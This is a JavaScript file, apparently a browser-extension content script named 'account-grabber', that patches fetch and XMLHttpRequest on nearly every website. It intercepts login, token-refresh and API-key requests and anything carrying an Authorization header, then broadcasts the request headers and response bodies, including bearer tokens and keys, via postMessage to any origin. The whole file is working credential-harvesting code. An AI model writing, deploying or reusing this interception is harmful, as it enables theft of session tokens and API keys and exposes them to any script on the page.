(() => {
  "use strict";

  if (window.__accountGrabberMainHook) return;
  window.__accountGrabberMainHook = true;

  if (!/^https?:$/.test(location.protocol) || location.hostname === "opencode.ai") return;

  const SOURCE = "account-grabber-main";
  const CANDIDATE_PATHS = [
    "/api/user/self",
    "/api/user/self/groups",
    "/api/v1/auth/login",
    "/api/v1/auth/refresh",
    "/api/v1/keys",
    "/v1/usage",
  ];

  function post(payload) {
    try {
      window.postMessage({ source: SOURCE, payload }, "*");
    } catch {}
  }

  function absoluteUrl(input) {
    try {
      const raw = typeof input === "string" ? input : input && input.url;
      return new URL(raw || "", location.href).href;
    } catch {
      return "";
    }
  }

  function headerObject(headers) {
    const result = {};
    try {
      if (!headers) return result;
      if (headers instanceof Headers) {
        headers.forEach((value, key) => (result[key] = value));
      } else if (Array.isArray(headers)) {
        for (const pair of headers) {
          if (pair && pair.length >= 2) result[String(pair[0])] = String(pair[1]);
        }
      } else if (typeof headers === "object") {
        for (const [key, value] of Object.entries(headers)) result[key] = String(value);
      }
    } catch {}
    return result;
  }

  function candidate(url, headers) {
    const text = String(url || "");
    if (CANDIDATE_PATHS.some((path) => text.includes(path))) return true;
    if (/\/api\/.*(?:token|access|security|key)|(?:access[_-]?token|api[_-]?key)/i.test(text)) return true;
    const h = headerObject(headers);
    return Object.keys(h).some((key) => key.toLowerCase() === "new-api-user" || key.toLowerCase() === "authorization");
  }

  async function responseText(response) {
    try {
      const type = response.headers && response.headers.get && response.headers.get("content-type");
      if (type && !/json|text|javascript|plain/i.test(type)) return "";
      return await response.clone().text();
    } catch {
      return "";
    }
  }

  const originalFetch = window.fetch;
  if (typeof originalFetch === "function") {
    window.fetch = async function(input, init) {
      const url = absoluteUrl(input);
      const headers = Object.assign(
        {},
        headerObject(input && input.headers),
        headerObject(init && init.headers)
      );
      const shouldCapture = candidate(url, headers);
      const response = await originalFetch.apply(this, arguments);
      if (shouldCapture) {
        responseText(response).then((text) => {
          post({ kind: "http", method: (init && init.method) || "GET", url, requestHeaders: headers, status: response.status, responseText: text });
        });
      }
      return response;
    };
  }

  const OriginalXHR = window.XMLHttpRequest;
  if (OriginalXHR && OriginalXHR.prototype) {
    const originalOpen = OriginalXHR.prototype.open;
    const originalSetRequestHeader = OriginalXHR.prototype.setRequestHeader;
    const originalSend = OriginalXHR.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) {
      this.__accountGrabber = { method: method || "GET", url: absoluteUrl(url), requestHeaders: {} };
      return originalOpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
      if (this.__accountGrabber) this.__accountGrabber.requestHeaders[String(name)] = String(value);
      return originalSetRequestHeader.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function() {
      const meta = this.__accountGrabber;
      if (meta && candidate(meta.url, meta.requestHeaders)) {
        this.addEventListener("load", () => {
          let text = "";
          try {
            text = this.responseType && this.responseType !== "text" ? "" : String(this.responseText || "");
          } catch {}
          post({ kind: "http", method: meta.method, url: meta.url, requestHeaders: meta.requestHeaders, status: this.status, responseText: text });
        });
      }
      return originalSend.apply(this, arguments);
    };
  }
})();
